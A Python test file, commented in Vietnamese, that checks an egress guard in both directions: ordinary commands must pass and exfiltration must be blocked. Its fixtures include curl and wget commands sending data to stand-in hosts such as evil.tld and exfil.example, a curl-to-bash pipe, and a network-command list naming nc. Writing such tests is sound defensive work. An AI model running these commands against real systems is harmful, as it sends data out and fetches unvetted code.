#!/usr/bin/env python3
"""egress-guard-falsepos-test — guard phải THA việc thường ngày và vẫn CẮN exfil thật.

Vì sao có file này (đo 2026-09-04, giữa một lượt /fdk-uat): guard CHẶN một lệnh UAT hoàn
toàn hợp lệ vì nó đọc `bootstrap.sh`, `uat.env`, `spec.loader`, `importlib.util`, `c.lower`
như thể là hostname. Nguyên nhân: nhánh fallback `_HOST_RE` khớp mọi token dạng `word.word`,
và nhánh heredoc-nuốt-cả-lệnh đưa nguyên thân code vào phạm vi quét.

Một guard cắn vào việc thường ngày thì người ta tắt nó đi — và tắt hẳn tệ hơn nhiều so với
một fallback hẹp hơn. Nên đây là bite-test HAI CHIỀU: tha đúng thứ phải tha, cắn đúng thứ
phải cắn. Chiều thứ hai quan trọng ngang chiều thứ nhất — nới guard mà không chứng minh nó
còn cắn là tự tháo rào.

Chạy: python3 harness/tests/egress-guard-falsepos-test.py
"""
import importlib.util
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "harness" / "scripts"))   # bnal_config nằm cạnh guard
spec = importlib.util.spec_from_file_location("eg", ROOT / "harness/scripts/egress-guard.py")
eg = importlib.util.module_from_spec(spec)
sys.modules["eg"] = eg
spec.loader.exec_module(eg)

CFG = {"egress": {"allow_domains": ["github.com", "raw.githubusercontent.com"],
                  "net_commands": ["curl", "wget", "nc", "scp", "rsync"]},
       "mode": "block", "verified": True}

# (mô tả, lệnh, có-được-phép-không)
CASES = [
    # ── PHẢI THA: việc thường ngày ─────────────────────────────────────────────
    ("curl tới host trong allow-list",
     'curl -fsSL "https://raw.githubusercontent.com/o/r/x.sh" | bash', True),
    ("đuôi file .sh/.env KHÔNG phải hostname",
     'source /tmp/uat.env; curl -fsSL "$RAW/harness/bootstrap.sh" | bash', True),
    ("chuỗi thuộc tính python trong heredoc KHÔNG phải hostname",
     'python3 - <<PY\nimport importlib.util\nspec.loader.exec_module(m)\nx = c.lower()\n'
     'print("curl")\nPY', True),
    ("commit message nhắc chữ curl + tên miền",
     # --no-verify: đây là CHUỖI fixture, không chạy; nhưng hook-guard-invariant-test quét
     # tests/ theo regex nên vẫn phải mang cửa hợp lệ (GH#30), nếu không CI repo-health đỏ.
     'git commit --no-verify -m "sửa curl để tới example.com"', True),
    ("không có lệnh mạng nào → không soi gì",
     'echo "https://evil.tld/steal"', True),

    # ── PHẢI CẮN: exfil thật ───────────────────────────────────────────────────
    ("curl tới host NGOÀI allow-list", 'curl https://evil.tld/steal', False),
    ("bare host ngoài allow-list ở đúng segment của curl", 'curl evil.tld/x', False),
    ("wget tới host lạ", 'wget http://exfil.example/dump', False),
    ("host lạ đi qua biến trong segment của curl",
     'H=evil.tld; curl "https://$H/x"', False),
    ("URL có scheme trong heredoc vẫn bị bắt (nới fallback KHÔNG được mở đường)",
     'python3 - <<PY\nimport os\nos.system("curl https://evil.tld/steal")\nPY', False),
]


def main() -> int:
    bad = 0
    for label, cmd, should_allow in CASES:
        problems = eg.check_bash(cmd, CFG)
        allowed = not problems
        ok = allowed == should_allow
        mark = "✓" if ok else "✗"
        want = "THA" if should_allow else "CẮN"
        print(f"  {mark} [{want}] {label}")
        if not ok:
            bad += 1
            print(f"      → thực tế: {'tha' if allowed else problems}")
    total = len(CASES)
    print(f"\negress-guard-falsepos-test: {total - bad}/{total} assertion "
          f"{'XANH' if not bad else 'ĐỎ'}")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
